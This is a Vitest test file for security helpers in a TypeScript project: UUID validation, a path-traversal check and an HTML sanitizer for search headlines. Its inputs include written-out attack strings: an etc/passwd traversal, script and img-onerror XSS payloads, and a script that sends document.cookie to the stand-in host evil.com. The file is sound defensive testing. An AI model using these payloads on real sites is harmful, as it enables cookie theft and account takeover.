import { describe, expect, it } from 'vitest';
import { isPathWithinBase, isValidUuid, sanitizeSearchHeadline } from '../src/utils/security.js';

describe('security.ts', () => {
  describe('isValidUuid', () => {
    it('should return true for valid lowercase UUID', () => {
      expect(isValidUuid('550e8400-e29b-41d4-a716-446655440000')).toBe(true);
    });

    it('should return true for valid uppercase UUID', () => {
      expect(isValidUuid('550E8400-E29B-41D4-A716-446655440000')).toBe(true);
    });

    it('should return true for valid mixed case UUID', () => {
      expect(isValidUuid('550e8400-E29B-41d4-A716-446655440000')).toBe(true);
    });

    it('should return false for invalid UUID', () => {
      expect(isValidUuid('not-a-uuid')).toBe(false);
      expect(isValidUuid('550e8400-e29b-41d4-a716')).toBe(false);
      expect(isValidUuid('')).toBe(false);
      expect(isValidUuid('550e8400e29b41d4a716446655440000')).toBe(false);
    });
  });

  describe('isPathWithinBase', () => {
    it('should return true for path within base', () => {
      expect(isPathWithinBase('/uploads', 'user123', 'photo.jpg')).toBe(true);
    });

    it('should return false for path traversal attempt', () => {
      expect(isPathWithinBase('/uploads', '..', 'etc', 'passwd')).toBe(false);
      expect(isPathWithinBase('/uploads', 'user/../..', 'secret')).toBe(false);
    });

    it('should return true for base path itself', () => {
      expect(isPathWithinBase('/uploads')).toBe(true);
    });
  });

  describe('sanitizeSearchHeadline', () => {
    it('should return empty string for null input', () => {
      expect(sanitizeSearchHeadline(null)).toBe('');
    });

    it('should return empty string for undefined input', () => {
      expect(sanitizeSearchHeadline(undefined)).toBe('');
    });

    it('should return empty string for empty string input', () => {
      expect(sanitizeSearchHeadline('')).toBe('');
    });

    it('should preserve <mark> tags from ts_headline', () => {
      const input = 'Hello <mark>World</mark>!';
      expect(sanitizeSearchHeadline(input)).toBe('Hello <mark>World</mark>!');
    });

    it('should preserve multiple <mark> tags', () => {
      const input = '<mark>John</mark> works at <mark>Acme</mark> Corp';
      expect(sanitizeSearchHeadline(input)).toBe(
        '<mark>John</mark> works at <mark>Acme</mark> Corp',
      );
    });

    it('should escape HTML entities outside of mark tags', () => {
      const input = '<mark>Test</mark> with <b>bold</b> & "quotes"';
      expect(sanitizeSearchHeadline(input)).toBe(
        '<mark>Test</mark> with &lt;b&gt;bold&lt;/b&gt; &amp; &quot;quotes&quot;',
      );
    });

    it('should prevent script tag XSS attacks', () => {
      const input = '<mark>John</mark><script>alert("xss")</script>';
      const result = sanitizeSearchHeadline(input);
      expect(result).not.toContain('<script>');
      expect(result).toBe('<mark>John</mark>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    });

    it('should prevent img tag XSS attacks', () => {
      const input = '<mark>User</mark><img src=x onerror=alert(1)>';
      const result = sanitizeSearchHeadline(input);
      expect(result).not.toContain('<img');
      expect(result).toBe('<mark>User</mark>&lt;img src=x onerror=alert(1)&gt;');
    });

    it('should prevent event handler XSS attacks', () => {
      const input = '<mark onmouseover="alert(1)">Test</mark>';
      // The mark tag itself is preserved but any attributes would be escaped
      // since we replace exact <mark> and </mark> only
      const result = sanitizeSearchHeadline(input);
      expect(result).toBe('&lt;mark onmouseover=&quot;alert(1)&quot;&gt;Test</mark>');
    });

    it('should handle malicious content in display_name field', () => {
      // Simulates: contact.display_name = '<script>document.location="evil.com?c="+document.cookie</script>'
      const input =
        '<script>document.location="evil.com?c="+document.cookie</script> <mark>matched</mark>';
      const result = sanitizeSearchHeadline(input);
      expect(result).not.toContain('<script>');
      expect(result).toContain('<mark>matched</mark>');
    });

    it('should handle case-insensitive mark tags', () => {
      const input = '<MARK>Test</MARK> and <Mark>Another</Mark>';
      expect(sanitizeSearchHeadline(input)).toBe('<mark>Test</mark> and <mark>Another</mark>');
    });

    it('should escape ampersands', () => {
      const input = 'Tom & <mark>Jerry</mark>';
      expect(sanitizeSearchHeadline(input)).toBe('Tom &amp; <mark>Jerry</mark>');
    });

    it('should escape single quotes', () => {
      const input = "It's <mark>great</mark>";
      expect(sanitizeSearchHeadline(input)).toBe('It&#x27;s <mark>great</mark>');
    });

    it('should handle nested/malformed mark tags safely', () => {
      const input = '<mark><mark>double</mark></mark>';
      const result = sanitizeSearchHeadline(input);
      // Inner malformed structure should be escaped
      expect(result).toBe('<mark><mark>double</mark></mark>');
    });

    it('should handle unicode content', () => {
      const input = '<mark>Muller</mark> works at Munchen GmbH';
      expect(sanitizeSearchHeadline(input)).toBe('<mark>Muller</mark> works at Munchen GmbH');
    });

    it('should not be vulnerable to placeholder injection', () => {
      // Try to inject static placeholder-like strings - they should be escaped, not become mark tags
      const input = '__MARK_OPEN__Test__MARK_CLOSE__';
      const result = sanitizeSearchHeadline(input);
      // Should be treated as plain text, not converted to mark tags
      expect(result).toBe('__MARK_OPEN__Test__MARK_CLOSE__');
      expect(result).not.toContain('<mark>');
    });

    it('should handle null byte injection attempts', () => {
      // Null bytes and other control characters should be handled safely
      const input = '<mark>Test</mark>\u0000<script>alert(1)</script>';
      const result = sanitizeSearchHeadline(input);
      expect(result).toContain('<mark>Test</mark>');
      expect(result).not.toContain('<script>');
    });
  });
});
